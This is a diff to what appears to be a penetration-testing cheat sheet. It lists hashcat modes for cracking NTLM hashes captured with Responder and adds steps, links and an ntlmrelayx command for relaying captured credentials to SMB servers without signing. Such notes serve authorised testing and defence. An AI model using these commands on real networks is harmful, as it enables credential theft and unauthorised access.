@@ -93,4 +93,9 @@ Crack Hashes from responder:
     hashcat -m 5500   #NTLMv1 (hashes captured from using a tool like Responder)     
     hashcat -m 5600   #NTLMv2 (hashes captured from using a tool like Responder)   
 
-Use [NTLMRelay](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) to relay the credentials to any SMB server which has SMB signing disabled (can't relay the creds back to the source computer).    
+Use NTLMRelay or MultiRelay to relay the credentials to any SMB server which has SMB signing disabled (can't relay the creds back to the source computer unless you are relaying them to a different service). Windows workstations have SMB signing disabled by default.          
+[byt3bl33d3r Guide to NTLM Relaying](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)    
+[NTLMRelay - Impacket Script](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
+
+    sudo python3 ntlmrelayx.py -tf targets -smb2support     
+[MultiRelay - Built into the Responder Toolkit](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py)      
